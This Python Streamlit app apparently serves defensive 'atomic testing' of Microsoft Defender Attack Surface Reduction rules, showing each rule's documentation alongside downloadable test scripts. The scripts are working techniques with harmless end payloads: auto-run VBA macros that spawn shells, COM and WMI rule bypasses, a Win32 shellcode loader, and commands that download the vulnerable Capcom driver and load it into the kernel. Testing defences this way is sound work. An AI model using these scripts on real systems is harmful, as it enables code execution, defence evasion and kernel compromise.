import streamlit as st

st.set_page_config(page_title="ASR Atomic Testing", layout="wide")

asr_rules = {
    "Block All Office applications from creating child processes": {
        "description": "This rule blocks Office apps from creating child processes. Office apps include Word, Excel, PowerPoint, OneNote, and Access.\n\nCreating malicious child processes is a common malware strategy. Malware that abuses Office as a vector often runs VBA macros and exploit code to download and attempt to run more payloads. However, some legitimate line-of-business applications might also generate child processes for benign purposes; such as spawning a command prompt or using PowerShell to configure registry settings.\n\nIntune name: Office apps launching child processes\n\nConfiguration Manager name: Block Office application from creating child processes\n\nGUID: d4f940ab-401b-4efc-aadc-ad5f3c50688a\n\nAdvanced hunting action type:\n\nAsrOfficeChildProcessAudited\nAsrOfficeChildProcessBlocked\n\nDependencies: Microsoft Defender Antivirus\n\nreference:\n\nhttps://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-all-office-applications-from-creating-child-processes\n\nhttps://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office\n\nhttps://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3",
        "scripts": [
            {
                "script": """
                Sub wshell_exec()
                    Set wsh = CreateObject("wscript.shell")
                    wsh.Run "powershell.exe", 1
                End Sub
                """
            },
            {
                "script": """
                Sub vba_exec()
                    dblShellReturn = Shell("powershell.exe", vbHide)
                End Sub
                """
            },
            {
                "script": """
                Sub parent_change()
                    Dim objOL
                    Set objOL = CreateObject("Outlook.Application")
                    Set shellObj = objOL.CreateObject("Wscript.Shell")
                    shellObj.Run ("notepad.exe")
                End Sub
                Sub AutoOpen()
                    parent_change
                End Sub
                """
            },
            {
                "script": """
                Sub ASR_blocked()
                    Dim WSHShell As Object
                    Set WSHShell = CreateObject("Wscript.Shell")
                    WSHShell.Run "cmd.exe"
                End Sub
                """
            },
            {
                "script": """
                Sub ASR_blocked2()
                    Dim WSHShell As Object
                    Set WSHShell = CreateObject("Shell.Application")
                    WSHShell.ShellExecute "cmd.exe"
                End Sub
                """
            },
            {
                "script": """
                Sub ASR_blocked3()
                    Call Shell("cmd.exe", 1)
                End Sub
                """
            },
            {
                "script": """
                Sub ASR_blocked4()
                    Set WshShell = CreateObject("WScript.Shell")
                    Set WshShellExec = WshShell.Exec("cmd.exe")
                End Sub
                """
            },
            {
                "script": """
                Sub ASR_blocked5()
                    Set obj = CreateObject("Excel.Application")
                    obj.DisplayAlerts = False
                    obj.DDEInitiate "cmd", "/c notepad.exe"
                End Sub
                """
            }
        ]
    },
    "Block Office applications from creating executable content": {
        "description": "This rule prevents Office apps, including Word, Excel, and PowerPoint, from creating potentially malicious executable content, by blocking malicious code from being written to disk.\n\nMalware that abuses Office as a vector might attempt to break out of Office and save malicious components to disk. These malicious components would survive a computer reboot and persist on the system. Therefore, this rule defends against a common persistence technique. This rule also blocks execution of untrusted files that may have been saved by Office macros that are allowed to run in Office files.\n\nIntune name: Office apps/macros creating executable content\n\nSCCM name: Block Office applications from creating executable content\n\nGUID: 3b576869-a4ec-4529-8536-b80a7769e899\n\nAdvanced hunting action type:\n\nAsrExecutableOfficeContentAudited\n\nAsrExecutableOfficeContentBlocked\n\nDependencies: Microsoft Defender Antivirus, RPC\n\nreference: https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-office-applications-from-creating-executable-content",
        "scripts": [
            {
                "script": """
                Sub Auto_Open()
                    Dim fso As Object
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Dim Fileout As Object
                    Set Fileout = fso.CreateTextFile("C:\\temp\\thalpius.exe", True, True)
                    Fileout.Write "your string goes here"
                    Fileout.Close
                End Sub
                """
            },
            {
                "script": """
                Sub Auto_Open()
                    Dim fso As Object
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Dim oFile As Object
                    Dim TmpFolder As Object
                    Set TmpFolder = fso.GetSpecialFolder(2)
                    Set oFile = fso.CreateTextFile(TmpFolder & "\\script.vbs")
                    oFile.WriteLine "Set wsh = CreateObject('wscript.shell')"
                    oFile.WriteLine "wsh.Run 'calc.exe', 1"
                    oFile.Close
                End Sub
                """
            },
            {
                "script": """
                Sub ASR_bypass_create_child_process_rule()
                    Const ShellBrowserWindow = _
                    "{C08AFD90-F2A1-11D1-8455-00A0C91F3880}"
                    Set SBW = GetObject("new:" & ShellBrowserWindow)
                    SBW.Document.Application.ShellExecute "cmd.exe", Null, "C:\\Windows\\System32", Null, 0
                End Sub
                """
            },
            {
                "script": """
                Sub ASR_bypass_create_child_process_rule2()
                    Const ExecuteShellCommand = _
                    "{49B2791A-B1AE-4C90-9B8E-E860BA07F889}"
                    Set MMC20 = GetObject("new:" & ExecuteShellCommand)
                    MMC20.Document.ActiveView.ExecuteShellCommand ("cmd.exe")
                End Sub
                """
            },
            {
                "script": """
                Sub ASR_bypass_create_child_process_rule3()
                    Const OUTLOOK = _
                    "{0006F03A-0000-0000-C000-000000000046}"
                    Set objShell = GetObject("new:" & OUTLOOK)
                    objShell.CreateObject("WScript.Shell").Run "cmd.exe", 0
                End Sub
                """
            },
            {
                "script": """
                Sub ASR_bypass_create_child_process_rule4()
                    Const ShellWindows = _
                    "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"
                    Set SW = GetObject("new:" & ShellWindows).Item()
                    SW.Document.Application.ShellExecute "cmd.exe", Null, "C:\\Windows\\System32", Null, 0
                End Sub
                """
            },
            {
                "script": """
                Sub ASR_bypass_create_child_process_rule5()
                    Const HIDDEN_WINDOW = 0
                    strComputer = "."
                    Set objWMIService = GetObject("win" & "mgmts" & ":\\" & strComputer & "\root" & "\cimv2")
                    Set objStartup = objWMIService.Get("Win32_" & "Process" & "Startup")
                    Set objConfig = objStartup.SpawnInstance_
                    objConfig.ShowWindow = HIDDEN_WINDOW
                    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root" & "\cimv2" & ":Win32_" & "Process")
                    objProcess.Create "cmd.exe", Null, objConfig, intProcessID
                End Sub
                """
            }
        ]
    },
    "Block JavaScript or VBScript from launching downloaded executable content": {
        "description": "Block JavaScript or VBScript from launching downloaded executable content\nThis rule prevents scripts from launching potentially malicious downloaded content. Malware written in JavaScript or VBScript often acts as a downloader to fetch and launch other malware from the Internet.\n\nAlthough not common, line-of-business applications sometimes use scripts to download and launch installers.\n\nIntune name: js/vbs executing payload downloaded from Internet (no exceptions)\n\nConfiguration Manager name: Block JavaScript or VBScript from launching downloaded executable content\n\nGUID: d3e037e1-3eb8-44c8-a917-57927947596d\n\nAdvanced hunting action type:\n\nAsrScriptExecutableDownloadAudited\nAsrScriptExecutableDownloadBlocked\n\nDependencies: Microsoft Defender Antivirus, AMSI\n\nreference: https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-javascript-or-vbscript-from-launching-downloaded-executable-content",
        "script": """
        Dim objShell
        Dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
        Dim bStrm: Set bStrm = createobject("Adodb.Stream")
        xHttp.Open "GET", "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe", False
        xHttp.Send
        with bStrm
            .type = 1
            .open
            .write xHttp.responseBody
            .savetofile "c:\\temp\\putty.exe", 2
        end with
        Set objShell = WScript.CreateObject("WScript.Shell")
        objShell.Exec("c:\\temp\\putty.exe")
        """
    },
    "Block process creations originating from PSExec and WMI commands": {
        "description": "Block process creations originating from PSExec and WMI commands\nThis rule blocks processes created through PsExec and WMI from running. Both PsExec and WMI can remotely execute code. There's a risk of malware abusing functionality of PsExec and WMI for command and control purposes, or to spread an infection throughout an organization's network.\n\n **Warning**\n\nOnly use this rule if you're managing your devices with Intune or another MDM solution. This rule is incompatible with management through Microsoft Endpoint Configuration Manager because this rule blocks WMI commands the Configuration Manager client uses to function correctly.\n\nIntune name: Process creation from PSExec and WMI commands\n\nConfiguration Manager name: Not applicable\n\nGUID: d1e49aac-8f56-4280-b9ba-993a6d77406c\n\nAdvanced hunting action type:\n\nAsrPsexecWmiChildProcessAudited\n\nAsrPsexecWmiChildProcessBlocked\n\nDependencies: Microsoft Defender Antivirus\n\nreference: https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-process-creations-originating-from-psexec-and-wmi-commands",
        "scripts": [
            {
                "script": """
                $A = New-ScheduledTaskAction -Execute "cmd.exe"
                $T = New-ScheduledTaskTrigger -once -At 5:25pm
                $S = New-ScheduledTaskSettingsSet
                $D = New-ScheduledTask -Action $A -Trigger $T -Settings $S
                Register-ScheduledTask Evil -InputObject $D
                """
            },
            {
                "script": """
                Sub ASR_bypass_create_child_process_rule5()
                Const HIDDEN_WINDOW = 0
                strComputer = "."
                Set objWMIService = GetObject("win" & "mgmts" & ":\\" & strComputer & "\root" & "\cimv2")
                Set objStartup = objWMIService.Get("Win32_" & "Process" & "Startup")
                Set objConfig = objStartup.SpawnInstance_
                objConfig.ShowWindow = HIDDEN_WINDOW
                Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root" & "\cimv2" & ":Win32_" & "Process")
                objProcess.Create "cmd.exe", Null, objConfig, intProcessID
                End Sub
                """
            }
        ]
    },
    "Block untrusted and unsigned processes that run from USB": {
        "description": "Block untrusted and unsigned processes that run from USB\nWith this rule, admins can prevent unsigned or untrusted executable files from running from USB removable drives, including SD cards. Blocked file types include executable files (such as .exe, .dll, or .scr)\n\n **Important**\n\nFiles copied from the USB to the disk drive will be blocked by this rule if and when it's about to be executed on the disk drive.\n\nIntune name: Untrusted and unsigned processes that run from USB\n\nConfiguration Manager name: Block untrusted and unsigned processes that run from USB\n\nGUID: b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4\n\nAdvanced hunting action type:\n\nAsrUntrustedUsbProcessAudited\n\nAsrUntrustedUsbProcessBlocked\n\nDependencies: Microsoft Defender Antivirus\n\n\nreference: https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-untrusted-and-unsigned-processes-that-run-from-usb",
        "script": """
        xcopy /s UNSIGNED_ransomware_test_exe.exe %temp% /y
        start %temp%\\UNSIGNED_ransomware_test_exe.exe
        """
    },
    "Block Win32 API calls from Office macros": {
        "description": "This rule prevents VBA macros from calling Win32 APIs.\n\nOffice VBA enables Win32 API calls. Malware can abuse this capability, such as calling Win32 APIs to launch malicious shellcode without writing anything directly to disk. Most organizations don't rely on the ability to call Win32 APIs in their day-to-day functioning, even if they use macros in other ways.\n\nSupported operating systems:\n\nWindows 10, version 1709, Windows 11, Windows Server 2022, Windows Server version 1809, Windows Server 2019\n\nConfiguration Manager CB 1710\n\nIntune name: Win32 imports from Office macro code\n\nConfiguration Manager name: Block Win32 API calls from Office macros\n\nGUID: 92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b\n\nAdvanced hunting action type:\n\nAsrOfficeMacroWin32ApiCallsAudited\n\nAsrOfficeMacroWin32ApiCallsBlocked\n\nDependencies: Microsoft Defender Antivirus, AMSI\n\nreference:\n\nhttps://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-win32-api-calls-from-office-macros\n\nhttps://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office",
        "scripts": [
            {
                "script": """
                #If Vba7 Then
                    Private Declare PtrSafe Function Create Lib "kernel32"  Alias "CreateThread" (ByVal Plw As Long, ByVal Bxzjkhnm As Long, ByVal Grmeywgct As LongPtr, Rirsi As Long, ByVal Puh As Long, Uxbkmiu As Long) As LongPtr
                    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Bgsndokwj As Long, ByVal Nmni As Long, ByVal Oobnx As Long, ByVal Ioioyh As Long) As LongPtr
                    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Vhzrnxtai As LongPtr, ByRef Ihfu As Any, ByVal Zkph As Long) As LongPtr
                #Else
                    Private Declare Function Create Lib "kernel32" Alias "CreateThread"  (ByVal Plw As Long, ByVal Bxzjkhnm As Long, ByVal Grmeywgct As Long, Rirsi As Long, ByVal Puh As Long, Uxbkmiu As Long) As Long
                    Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Bgsndokwj As Long, ByVal Nmni As Long, ByVal Oobnx As Long, ByVal Ioioyh As Long) As Long
                    Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Vhzrnxtai As Long, ByRef Ihfu As Any, ByVal Zkph As Long) As Long
                #EndIf

                Sub Auto_Open()
                    Dim Qgvx As Long, Cdeokfqii As Variant, Zuszlsq As Long
                #If Vba7 Then
                    Dim  Slut As LongPtr, Lytcsql As LongPtr
                #Else
                    Dim  Slut As Long, Lytcsql As Long
                #EndIf
                    Cdeokfqii = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193, _
                207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,106,1,141,133,178,0,0,0,80,104,49,139,111,135,255,213,187,240,181,162,86,104,166,149, _
                189,157,255,213,60,6,124,10,128,251,224,117,5,187,71,19,114,111,106,0,83,255,213,99,97,108,99,46,101,120,101,0)

                    Slut = VirtualAlloc(0, UBound(Cdeokfqii), &H1000, &H40)
                    For Zuszlsq = LBound(Cdeokfqii) To UBound(Cdeokfqii)
                        Qgvx = Cdeokfqii(Zuszlsq)
                        Lytcsql = RtlMoveMemory(Slut + Zuszlsq, Qgvx, 1)
                    Next Zuszlsq
                    Lytcsql = Create(0, 0, Slut, 0, 0, 0)
                End Sub
                Sub AutoOpen()
                    Auto_Open
                End Sub
                Sub Workbook_Open()
                    Auto_Open
                End Sub
                """
            },
            
            {
                "script": """
                #If VBA7 Then
                    Private Declare PtrSafe Function MessageBox Lib "user32" Alias "MessageBoxA" _
                        (ByVal hwnd As LongPtr, ByVal lpText As String, ByVal lpCaption As String, ByVal wType As Long) As Long
                #Else
                    Private Declare Function MessageBox Lib "user32" Alias "MessageBoxA" _
                        (ByVal hwnd As Long, ByVal lpText As String, ByVal lpCaption As String, ByVal wType As Long) As Long
                #End If

                Sub ShowMessageBox()
                    Call MessageBox(0, "Hello, World!", "API Test", 0)
                End Sub
                """
            }
        ] 
    },

    "Block abuse of exploited vulnerable signed drivers": {
        "description": "This rule prevents an application from writing a vulnerable signed driver to disk. In-the-wild, vulnerable signed drivers can be exploited by local applications - that have sufficient privileges - to gain access to the kernel. Vulnerable signed drivers enable attackers to disable or circumvent security solutions, eventually leading to system compromise.\n\nThe Block abuse of exploited vulnerable signed drivers rule doesn't block a driver already existing on the system from being loaded.\n\nNote\n\nYou can configure this rule using Intune OMA-URI. See Intune OMA-URI for configuring custom rules.\n\nYou can also configure this rule using PowerShell.\n\nTo have a driver examined, use this Web site to Submit a driver for analysis.\n\nIntune Name: Block abuse of exploited vulnerable signed drivers\n\nAdvanced hunting action type:\n\nAsrVulnerableSignedDriverAudited\n\nAsrVulnerableSignedDriverBlocked\n\nreference:\n\nhttps://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-abuse-of-exploited-vulnerable-signed-drivers",
        "scripts": [
            {
                "script": """
                Dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
                Dim bStrm: Set bStrm = createobject("Adodb.Stream")
                xHttp.Open "GET", "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/73c98438ac64a68e88b7b0afd11ba140.bin", False
                xHttp.Send

                with bStrm
                    .type = 1 '//binary
                    .open
                    .write xHttp.responseBody
                    .savetofile "C:\\windows\\temp\\capcom.sys", 2 '//overwrite
                end with

                Set objShell = WScript.CreateObject("WScript.Shell")
                objShell.Run "sc.exe create capcom.sys binPath=C:\\windows\\temp\\capcom.sys type=kernel", 0, True
                objShell.Run "sc.exe start capcom.sys", 0, True
                """
            },
            {
                "script": """
                Invoke-WebRequest -Uri "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/73c98438ac64a68e88b7b0afd11ba140.bin" -OutFile "C:\\windows\\temp\\capcom.sys"
                Start-Process "sc.exe" -ArgumentList "create capcom.sys binPath=C:\\windows\\temp\\capcom.sys type=kernel" -NoNewWindow -Wait
                Start-Process "sc.exe" -ArgumentList "start capcom.sys" -NoNewWindow -Wait
                """
            }
        ]
    },

    "Block Adobe Reader from creating child processes": {
        "description": "This rule prevents attacks by blocking Adobe Reader from creating processes. Malware can download and launch payloads and break out of Adobe Reader through social engineering or exploits. By blocking child processes from being generated by Adobe Reader, malware attempting to use Adobe Reader as an attack vector are prevented from spreading. [Further details and references will be added here.]",
        "scripts": []
    },
    "Block credential stealing from the Windows local security authority subsystem": {
        "description": "This rule helps prevent credential stealing by locking down Local Security Authority Subsystem Service (LSASS). LSASS authenticates users who sign in on a Windows computer. Microsoft Defender Credential Guard in Windows normally prevents attempts to extract credentials from LSASS. Some organizations can't enable Credential Guard on all of their computers because of compatibility issues with custom smartcard drivers or other programs that load into the Local Security Authority (LSA). In these cases, attackers can use tools like Mimikatz to scrape cleartext passwords and NTLM hashes from LSASS. [Further details and references will be added here.]",
        "scripts": []
    },
    "Block executable content from email client and webmail": {
        "description": "This rule blocks the following file types from launching from email opened within the Microsoft Outlook application, or Outlook.com and other popular webmail providers: Executable files (such as .exe, .dll, or .scr), Script files (such as a PowerShell .ps1, Visual Basic .vbs, or JavaScript .js file). [Further details and references will be added here.]",
        "scripts": []
    },
    "Block executable files from running unless they meet a prevalence, age, or trusted list criterion": {
        "description": "This rule blocks executable files, such as .exe, .dll, or .scr, from launching. Launching untrusted or unknown executable files can be risky, as it might not be initially clear if the files are malicious. [Further details and references will be added here.]",
        "scripts": []
    },
    "Block execution of potentially obfuscated scripts": {
        "description": "This rule detects suspicious properties within an obfuscated script. Script obfuscation is a common technique that both malware authors and legitimate applications use to hide intellectual property or decrease script loading times. Malware authors also use obfuscation to make malicious code harder to read, which hampers close scrutiny by humans and security software. [Further details and references will be added here.]",
        "scripts": []
    },
    "Block Office applications from injecting code into other processes": {
        "description": "This rule blocks code injection attempts from Office apps into other processes. Attackers might attempt to use Office apps to migrate malicious code into other processes through code injection, so the code can masquerade as a clean process. [Further details and references will be added here.]",
        "scripts": []
    },
    "Block Office communication application from creating child processes": {
        "description": "This rule prevents Outlook from creating child processes, while still allowing legitimate Outlook functions. This rule protects against social engineering attacks and prevents exploiting code from abusing vulnerabilities in Outlook. [Further details and references will be added here.]",
        "scripts": []
    },
    "Block persistence through WMI event subscription": {
        "description": "This rule prevents malware from abusing WMI to attain persistence on a device. Fileless threats employ various tactics to stay hidden, to avoid being seen in the file system, and to gain periodic execution control. Some threats can abuse the WMI repository and event model to stay hidden. [Further details and references will be added here.]",
        "scripts": []
    },
    "Block Webshell creation for Servers": {
        "description": "Block Webshell creation for Servers\nGUID: a8f5898e-1dc8-49a9-9878-85004b8a61e6\n\nSupported operating systems:\n\nWindows 11",
        "scripts": []
    },
    "Use advanced protection against ransomware": {
        "description": "This rule provides an extra layer of protection against ransomware. It uses both client and cloud heuristics to determine whether a file resembles ransomware. The rule tends to err on the side of caution to prevent ransomware. [Further details and references will be added here.]",
        "scripts": []
    }

}

st.title("ASR Atomic Testing")

def determine_file_extension(script):
    if 'Sub ' in script or 'Function ' in script:
        return '.vbs'
    elif 'xcopy ' in script:
        return '.bat'
    elif 'invoke ' in script or 'Start-Process ' in script:
        return '.ps1'
    else:
        return '.txt'

for rule_name, rule_info in asr_rules.items():
    with st.expander(rule_name):
        st.write(rule_info["description"])
        
        if "scripts" in rule_info:
            for i, script_info in enumerate(rule_info["scripts"]):
                if isinstance(script_info["script"], list):
                    script = "\n".join(item["script"] for item in script_info["script"])
                else:
                    script = script_info["script"]
                st.code(script, language="vb")
                file_extension = determine_file_extension(script)
                download_filename = f"{rule_name.replace(' ', '_')}_script_{i+1}{file_extension}"
                st.download_button(
                    label=f"Download Script {i+1}",
                    data=script,
                    file_name=download_filename,
                    mime="text/plain"
                )